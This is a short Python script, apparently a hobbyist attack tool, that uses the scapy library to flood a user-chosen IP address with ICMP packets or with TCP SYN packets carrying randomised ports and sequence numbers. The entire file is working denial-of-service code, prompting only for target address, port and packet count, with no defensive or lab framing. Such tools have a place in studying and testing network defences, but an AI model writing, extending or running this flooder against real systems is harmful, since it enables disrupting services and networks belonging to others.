#/usr/bin/python3
#@EmreOvunc
#pip3 install scapy
from scapy.all import *


def main():
    user_input = input("Please select one of the attack type [syn, icmp]: ")
    if user_input == "icmp":
        icmpflood()
    elif user_input == "syn":
        synflood()
    else:
        print("[ERROR] Select one of the attack type !!!")
        main()


def icmpflood():
    target = destinationIP()
    cycle = input("How many packets do you sent [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range (0,int(cycle)):
        send(IP(dst=target)/ICMP())


def synflood():
    target = destinationIP()
    targetPort = destinationPort()
    cycle = input("How many packets do you sent [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range(0, int(cycle)):
        send(IP(dst=target)/TCP(dport=targetPort,
                                flags="S",
                                seq=RandShort(),
                                ack=RandShort(),
                                sport=RandShort()))


def destinationIP():
    dstIP = input("Destination IP: ")
    return dstIP


def destinationPort():
    dstPort = input("Destination Port: ")
    return int(dstPort)


main()

